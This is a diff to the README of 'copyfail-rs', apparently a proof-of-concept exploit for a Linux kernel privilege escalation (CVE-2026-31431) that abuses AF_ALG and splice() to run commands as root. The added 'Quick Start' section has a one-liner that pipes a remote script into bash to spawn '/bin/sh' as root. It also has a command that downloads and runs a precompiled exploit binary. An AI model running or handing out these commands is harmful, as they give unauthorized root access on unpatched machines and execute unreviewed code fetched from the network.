@@ -14,9 +14,19 @@ Based on the research and PoC by [Xint Code](https://xint.io/blog/copy-fail-linu
 - **Zero-Copy Exploitation**: Directly interacts with the Linux kernel's `AF_ALG` and `splice()` syscalls via `libc`.
 - **Customizable**: Specify the command you want to run as root via CLI arguments.
 
+## Quick Start (One-liner)
+You can run the PoC directly using the helper script:
+```bash
+curl -fsSL https://raw.githubusercontent.com/sammwyy/copyfail-rs/main/copyfail-rs.sh | bash -s -- "/bin/sh"
+```
+
+Or download the pre-compiled binary manually:
+```bash
+curl -L https://github.com/sammwyy/copyfail-rs/releases/download/poc/copyfail-rs_x86-64 -o copyfail-rs && chmod +x copyfail-rs && ./copyfail-rs
+```
+
 ## Prerequisites
 - A Linux kernel vulnerable to **CVE-2026-31431** (typically kernels before the patch in April 2026).
-- Rust and Cargo installed.
 - Access to a target binary with read permissions (default is `/usr/bin/su`).
 
 ## Installation
